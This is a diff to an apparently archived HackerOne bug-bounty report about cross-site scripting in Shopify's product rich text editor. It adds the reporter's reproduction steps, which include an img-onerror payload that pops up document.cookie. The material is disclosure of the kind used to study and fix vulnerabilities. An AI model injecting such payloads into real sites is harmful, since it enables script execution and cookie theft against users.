@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2020-09-15
 submitted: 2020-09-10T04:06:27.552Z
 bounty_usd: null
@@ -36,6 +37,23 @@ Recently we deployed an HTML sanitization function to the Rich Text Editor in sp
 > - **XSS - Rich Text Editor** - Issues relating to execution of JavaScript in the legacy Rich Text Editor in the Legal settings, Blogs section, and Pages section of the Shopify admin.
 
 As this exclusion states, all new reports regarding the legal settings, blogs, and pages sections will still be considered invalid and a Known Issue. New XSS reports regarding the rich text editors in the Products and Collections sections may be valid.
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+I tried to make a product description and add the xss script in the paragraph.
+
+## steps for reproduction
+1. create a new product
+2. enter xss in the product description paragraph, such as;
+`<div align =" center "data-mce-fragment =" 1 "> <img src = x onerror = prompt (document.cookie)>
+<h4 dir = "ltr" data-mce-fragment = "1"> <span style = "text-decoration: underline; color: # ff2a00;"> <em> <strong> (name_product) </strong></em></span> </h4>
+</div> ``
+
+## Impact
+
+xss can be triggered
 
 ## Timeline
 
